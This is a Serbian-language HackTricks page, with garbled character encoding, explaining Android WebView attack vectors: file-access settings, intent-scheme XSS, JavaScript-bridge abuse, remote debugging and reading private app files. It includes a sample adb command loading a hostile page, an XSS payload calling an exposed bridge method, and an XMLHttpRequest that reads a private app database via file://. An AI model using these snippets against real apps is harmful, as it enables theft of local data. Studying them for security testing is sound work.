# Napadi na WebView

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## VodiÄ o Konfiguracijama i Bezbednosti WebView-a

### Pregled Ranjivosti WebView-a

KljuÄni aspekt Android razvoja ukljuÄuje pravilno rukovanje WebViews-ima. Ovaj vodiÄ istiÄe kljuÄne konfiguracije i prakse bezbednosti za smanjenje rizika povezanih sa koriÅ¡Ä‡enjem WebView-a.

![Primer WebView-a](<../../.gitbook/assets/image (1190).png>)

### **Pristup fajlovima u WebView-ima**

Podrazumevano, WebViews dozvoljavaju pristup fajlovima. Ova funkcionalnost se kontroliÅ¡e metodom `setAllowFileAccess()`, dostupnom od Android API nivoa 3 (Cupcake 1.5). Aplikacije sa dozvolom **android.permission.READ\_EXTERNAL\_STORAGE** mogu Äitati fajlove sa spoljnog skladiÅ¡ta koristeÄ‡i URL Å¡emu fajla (`file://putanja/do/fajla`).

#### **Zastarele Funkcionalnosti: Univerzalni pristup i Pristup Fajlovima Putem URL-ova**

* **Univerzalni pristup putem URL-ova fajlova**: Ova zastarela funkcionalnost je dozvoljavala zahteve preko granica sa URL-ova fajlova, predstavljajuÄ‡i znaÄajan bezbednosni rizik zbog potencijalnih XSS napada. Podrazumevana postavka je onemoguÄ‡ena (`false`) za aplikacije usmerene na Android Jelly Bean i novije verzije.
* Za proveru ove postavke, koristite `getAllowUniversalAccessFromFileURLs()`.
* Za modifikaciju ove postavke, koristite `setAllowUniversalAccessFromFileURLs(boolean)`.
* **Pristup fajlovima putem URL-ova fajlova**: Ova funkcionalnost, takoÄ‘e zastarela, kontrolisala je pristup sadrÅ¾aju sa drugih URL-ova fajlova. Kao i univerzalni pristup, podrazumevana postavka je onemoguÄ‡ena radi poboljÅ¡ane bezbednosti.
* Koristite `getAllowFileAccessFromFileURLs()` za proveru i `setAllowFileAccessFromFileURLs(boolean)` za podeÅ¡avanje.

#### **Bezbedno UÄitavanje Fajlova**

Za onemoguÄ‡avanje pristupa fajl sistemu dok se i dalje pristupa resursima i aktivama, koristi se metoda `setAllowFileAccess()`. Sa Android R i novijim verzijama, podrazumevana postavka je `false`.

* Proverite sa `getAllowFileAccess()`.
* OmoguÄ‡ite ili onemoguÄ‡ite sa `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Klasa **WebViewAssetLoader** je moderni pristup za uÄitavanje lokalnih fajlova. Koristi http(s) URL-ove za pristup lokalnim aktivama i resursima, usklaÄ‘ujuÄ‡i se sa politikom istog porekla, olakÅ¡avajuÄ‡i time upravljanje CORS-om.

### loadUrl

Ovo je Äesta funkcija koja se koristi za uÄitavanje proizvoljnih URL-ova u webview-u:
```java
webview.loadUrl("<url here>")
```
### **JavaScript i rukovanje Intent Å¡emom**

* **JavaScript**: OnemoguÄ‡en je podrazumevano u WebViews-u, moÅ¾e se omoguÄ‡iti putem `setJavaScriptEnabled()`. Savetuje se oprez jer omoguÄ‡avanje JavaScript-a bez odgovarajuÄ‡ih zaÅ¡tita moÅ¾e dovesti do bezbednosnih ranjivosti.
* **Intent Scheme**: WebViews mogu rukovati `intent` Å¡emom, Å¡to potencijalno moÅ¾e dovesti do eksploatacije ako se paÅ¾ljivo ne upravlja. Primer ranjivosti ukljuÄivao je izloÅ¾eni WebView parametar "support\_url" koji bi mogao biti iskoriÅ¡Ä‡en za izvoÄ‘enje napada preko skriptova na razliÄitim sajtovima (XSS).

![Ranjiv WebView](<../../.gitbook/assets/image (1191).png>)

Primer eksploatacije koriÅ¡Ä‡enjem adb:

{% code overflow="wrap" %}
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView â€“es support_url "https://example.com/xss.html"
```
{% endcode %}

### JavaScript Most

Android pruÅ¾a funkciju koja omoguÄ‡ava **JavaScript-u** u WebView-u da poziva **nativne funkcije Android aplikacije**. Ovo se postiÅ¾e koriÅ¡Ä‡enjem metode `addJavascriptInterface`, koja integriÅ¡e JavaScript sa nativnim Android funkcionalnostima, nazvanu _WebView JavaScript most_. Potrebna je opreznost jer ova metoda omoguÄ‡ava svim stranicama unutar WebView-a pristup registrovanom JavaScript interfejs objektu, Å¡to predstavlja sigurnosni rizik ako osetljive informacije budu izloÅ¾ene putem ovih interfejsa.

* **Izuzetna opreznost je potrebna** za aplikacije koje ciljaju Android verzije ispod 4.2 zbog ranjivosti koja omoguÄ‡ava izvrÅ¡avanje udaljenog koda putem zlonamernog JavaScript-a, eksploatiÅ¡uÄ‡i refleksiju.

#### Implementacija JavaScript Mosta

* **JavaScript interfejsi** mogu da komuniciraju sa nativnim kodom, kao Å¡to je prikazano u primerima gde je metoda klase izloÅ¾ena JavaScript-u:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
* JavaScript Bridge je omoguÄ‡en dodavanjem interfejsa WebView-u:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```
* Potencijalna eksploatacija putem JavaScript-a, na primer, putem XSS napada, omoguÄ‡ava pozivanje izloÅ¾enih Java metoda:
```html
<script>alert(javascriptBridge.getSecret());</script>
```
* Da biste smanjili rizike, **ograniÄite koriÅ¡Ä‡enje JavaScript mosta** na kod isporuÄen sa APK-om i spreÄite uÄitavanje JavaScript-a sa udaljenih izvora. Za starije ureÄ‘aje, postavite minimalni API nivo na 17.

### IzvrÅ¡avanje udaljenog koda zasnovano na refleksiji (RCE)

* Dokumentovana metoda omoguÄ‡ava postizanje RCE-a putem refleksije izvrÅ¡avanjem odreÄ‘enog payload-a. MeÄ‘utim, `@JavascriptInterface` anotacija spreÄava neovlaÅ¡Ä‡en pristup metodama, ograniÄavajuÄ‡i povrÅ¡inu napada.

### Udaljeno ispravljanje greÅ¡aka

* **Udaljeno ispravljanje greÅ¡aka** je moguÄ‡e pomoÄ‡u **Chrome Developer alata**, omoguÄ‡avajuÄ‡i interakciju i proizvoljno izvrÅ¡avanje JavaScript koda unutar WebView sadrÅ¾aja.

#### OmoguÄ‡avanje udaljenog ispravljanja greÅ¡aka

* Udaljeno ispravljanje greÅ¡aka moÅ¾e biti omoguÄ‡eno za sve WebViews unutar aplikacije putem:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
* Da biste uslovno omoguÄ‡ili debagovanje na osnovu stanja aplikacije koja se moÅ¾e debagovati:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Iznesite proizvoljne datoteke

* Demonstrira iznoÅ¡enje proizvoljnih datoteka koriÅ¡Ä‡enjem XMLHttpRequest-a:
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## Reference

* [https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
* [https://github.com/authenticationfailure/WheresMyBrowser.Android](https://github.com/authenticationfailure/WheresMyBrowser.Android)
* [https://developer.android.com/reference/android/webkit/WebView](https://developer.android.com/reference/android/webkit/WebView)
* [https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
* [https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
